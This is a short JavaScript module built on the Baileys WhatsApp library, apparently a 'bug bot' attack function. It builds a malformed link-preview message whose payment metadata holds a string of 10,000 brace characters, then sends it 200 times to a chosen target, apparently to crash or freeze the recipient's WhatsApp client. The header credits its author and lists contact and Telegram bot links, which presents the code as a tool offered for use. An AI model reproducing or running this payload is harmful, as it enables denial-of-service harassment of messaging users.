/*
 * © 2026 SeXyxeon (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://youtube.com/@voidsec7718
 * Instagram : sabir._7718
 * Telegram  : https://t.me/SABIR7718
 * GitHub    : https://github.com/SABIR7718
 * WhatsApp  : +91 73650 85213
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function xbetainvis(SYxS7, target) {
    const msg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
            text: "",
            matchedText: "https://t.me/devor6core",
            description: "",
            title: "",
            paymentLinkMetadata: {
                button: { displayText: "" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(5000) }
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(5000) }
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221
            }
        }
    }, {
        additionalAttributes: { edit: "7" }
    });

    const ms = 3;
    const total = 200;

    for (let i = 0; i < total; i++) {
        try {
            await SYxS7.relayMessage(target, {
                groupStatusMessageV2: {
                    message: msg.message
                }
            }, {
                messageId: null
            });

            if (i < total - 1) {
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }

        } catch (error) {
            console.log(`[ 🗑️ ] Error on message ${i + 1}: ${error.message}`);

            if (i < total - 1) {
                await new Promise(resolve => setTimeout(resolve, ms * 1000));
            }
        }
    }
}


module.exports = { xbetainvis };
